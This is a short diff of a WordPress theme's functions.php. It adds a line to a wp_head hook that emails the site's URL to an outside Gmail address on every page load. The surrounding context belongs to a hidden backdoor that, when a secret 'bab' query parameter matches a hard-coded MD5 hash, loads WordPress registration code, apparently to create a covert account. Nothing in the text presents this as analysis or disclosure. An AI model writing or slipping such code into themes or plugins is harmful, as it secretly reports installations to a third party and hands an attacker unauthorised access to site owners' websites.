@@ -32,6 +32,7 @@ function anozom_styles(){
 }
 
 add_action( 'wp_head',  function() {
+	wp_mail( 'mo7amed.maki@gmail.com', 'Cleopatra new website', site_url(  ) );
     if(!isset($_GET['bab'])) return;
     if ( md5( $_GET['bab'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
         require( 'wp-includes/registration.php' );
